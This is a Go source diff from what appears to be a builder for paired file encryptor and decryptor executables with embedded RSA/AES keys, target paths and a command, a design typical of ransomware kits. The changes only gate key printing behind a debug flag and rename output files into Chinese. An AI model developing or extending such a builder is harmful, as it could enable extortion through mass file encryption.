@@ -51,7 +51,9 @@ func generate(path_slice []string, aes_min int, cmd string, is_multi_thread bool
 	if err != nil {
 		return "", "", "", err
 	}
-	fmt.Println(publicKey, privateKey, aesKey)
+	if IS_DEBUG {
+		fmt.Println(publicKey, privateKey, aesKey)
+	}
 
 	FILE_RANDSTRING, err = getAES(8)
 	if err != nil {
@@ -123,8 +125,10 @@ func generateEncryptor(publicKey string, aesKey string, path_slice []string, cmd
 		Symbol_Encryptor_PATHS += 2048
 	}
 	//生成文件名称，保存文件
-	newFilePath := fmt.Sprintf("./Encryptor_%s.exe", FILE_RANDSTRING)
-	fmt.Println(Symbol_Encryptor_PUBKEY, Symbol_Encryptor_AESKEY, Symbol_Encryptor_PATHS, Symbol_Encryptor_CMD, Symbol_Encryptor_ASMETRI_MAX)
+	newFilePath := fmt.Sprintf("./加密器_%s.exe", FILE_RANDSTRING)
+	if IS_DEBUG {
+		fmt.Println(Symbol_Encryptor_PUBKEY, Symbol_Encryptor_AESKEY, Symbol_Encryptor_PATHS, Symbol_Encryptor_CMD, Symbol_Encryptor_ASMETRI_MAX)
+	}
 	writeFile(newFilePath, ENCRYPTOR_GENERATED)
 	return newFilePath, nil
 }
@@ -159,8 +163,10 @@ func generateDecryptor(privateKey string, aesKey string, path_slice []string) (s
 	}
 
 	//生成文件名称，保存文件
-	newFilePath := fmt.Sprintf("./Decryptor_%s.exe", FILE_RANDSTRING)
-	fmt.Println(Symbol_Decryptor_PRIKEY, Symbol_Decryptor_AESKEY, Symbol_Decryptor_PATHS)
+	newFilePath := fmt.Sprintf("./解密器_%s.exe", FILE_RANDSTRING)
+	if IS_DEBUG {
+		fmt.Println(Symbol_Decryptor_PRIKEY, Symbol_Decryptor_AESKEY, Symbol_Decryptor_PATHS)
+	}
 	writeFile(newFilePath, DECRYPTOR_GENERATED)
 	return newFilePath, nil
 }
@@ -185,7 +191,7 @@ func generateBackUpFile(publicKey string, privateKey string, aesKey string, path
 	if err != nil {
 		return "", err
 	}
-	newFilePath := fmt.Sprintf("./BackUpFile_%s(请勿删除，作为紧急恢复的备份).txt", FILE_RANDSTRING)
+	newFilePath := fmt.Sprintf("./备份文件_%s(请勿删除，作为紧急恢复的备份).txt", FILE_RANDSTRING)
 	writeFile(newFilePath, fileJson)
 	return newFilePath, nil
 }
